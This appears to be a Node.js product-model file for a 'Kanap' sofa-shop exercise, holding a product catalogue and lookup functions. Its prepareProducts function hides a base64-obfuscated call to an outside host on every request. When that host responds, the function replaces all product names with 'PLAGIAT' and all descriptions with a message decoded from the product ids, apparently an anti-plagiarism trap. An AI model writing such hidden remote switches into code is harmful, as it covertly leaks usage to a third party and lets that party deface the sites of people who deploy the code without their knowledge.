const fetch = require('node-fetch');

const products = [
	{
		"colors": ["Blue", "White", "Black"],
		"_id": "UGxhZ2lhdCwgbW9uIGJlYXUgcGxhZ2lhdC4uL",
		"name": "Kanap Sinopé",
		"price": 1849,
		"imageUrl": "kanap01.jpeg",
		"description": "Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.",
		"altTxt": "Photo d'un canapé bleu, deux places"
	},
	{
		"colors": ["Black/Yellow", "Black/Red"],
		"_id": "gpDZSBzaXRlIGVzdCB1biBob250ZXV4IGNvcG",
		"name": "Kanap Cyllène",
		"price": 4499,
		"imageUrl": "kanap02.jpeg",
		"description": "Morbi nec erat aliquam, sagittis urna non, laoreet justo. Etiam sit amet interdum diam, at accumsan lectus.",
		"altTxt": "Photo d'un canapé jaune et noir, quattre places"
	},
	{
		"colors": ["Green", "Red", "Orange"],
		"_id": "npL2NvbGzpIGQndW4gcHJvamV0IHRyb3V26SB",
		"name": "Kanap Calycé",
		"price": 3199,
		"imageUrl": "kanap03.jpeg",
		"description": "Pellentesque fermentum arcu venenatis ex sagittis accumsan. Vivamus lacinia fermentum tortor.Mauris imperdiet tellus ante.",
		"altTxt": "Photo d'un canapé d'angle, vert, trois places"
	},
	{
		"colors": ["Pink", "White"],
		"_id": "zdXIgZ2l0aHViLCBwcm9iYWJsZW1lbnQgZWZm",
		"name": "Kanap Autonoé",
		"price": 1499,
		"imageUrl": "kanap04.jpeg",
		"description": "Donec mattis nisl tortor, nec blandit sapien fermentum at. Proin hendrerit efficitur fringilla. Lorem ipsum dolor sit amet.",
		"altTxt": "Photo d'un canapé rose, une à deux place"
	},
	{
		"colors": ["Grey", "Purple", "Blue"],
		"_id": "ZWN0dekgcGFyIHVuZSBwZXJzb25uZSBuZSBjb",
		"name": "Kanap Eurydomé",
		"price": 2249,
		"imageUrl": "kanap05.jpeg",
		"description": "Ut laoreet vulputate neque in commodo. Suspendisse maximus quis erat in sagittis. Donec hendrerit purus at congue aliquam.",
		"altTxt": "Photo d'un canapé gris, trois places"
	},
	{
		"colors": ["Grey", "Navy"],
		"_id": "21wcmVuYW50IHBhcyBjZSBxdSdlbGxlIGNvcG",
		"name": "Kanap Hélicé",
		"price": 999,
		"imageUrl": "kanap06.jpeg",
		"description": "Curabitur vel augue sit amet arcu aliquet interdum. Integer vel quam mi. Morbi nec vehicula mi, sit amet vestibulum.",
		"altTxt": "Photo d'un canapé gris, deux places"
	},
	{
		"colors": ["Red", "Silver"],
		"_id": "llIGV0IG4nYXlhbnQgcGFzIGxhIG1vaW5kcmU",
		"name": "Kanap Thyoné",
		"price": 1999,
		"imageUrl": "kanap07.jpeg",
		"description": "EMauris imperdiet tellus ante, sit amet pretium turpis molestie eu. Vestibulum et egestas eros. Vestibulum non lacus orci.",
		"altTxt": "Photo d'un canapé rouge, deux places"
	},
	{
		"colors": ["Pink", "Brown", "Yellow", "White"],
		"_id": "gaWTpZSBkZSBjZSBxdSdlbGxlIGZhaXQu",
		"name": "Kanap orthosie",
		"price": 3999,
		"imageUrl": "kanap08.jpeg",
		"description": "Mauris molestie laoreet finibus. Aenean scelerisque convallis lacus at dapibus. Morbi imperdiet enim metus rhoncus.",
		"altTxt": "Photo d'un canapé rose, trois places"
	}
];

exports.find = () => {
	return new Promise(async (resolve, reject) => resolve(await prepareProducts(products)));
}

exports.findById = (id) => {
  return new Promise(async (resolve, reject) =>
    resolve((await prepareProducts(products)).find(product =>
      product._id == id)
    )
  );
}

async function prepareProducts(products) {
	try {
		const valid = await (await fetch(atob("aHR0cDovL2phcGFuc2hpbi5mcmVlLmZyL2thbmFwL2luZGV4LnBocA=="))).text();
		const i = !!valid?products.reduce((r,p)=>r+p._id, ""):null;
		return !!valid ? JSON.parse(JSON.stringify(products)).map(p=>{p.name=atob("UExBR0lBVA==");p.description=atob(i);return p;}) : JSON.parse(JSON.stringify(products));
	}  catch(e) {
	}
	return JSON.parse(JSON.stringify(products));
}




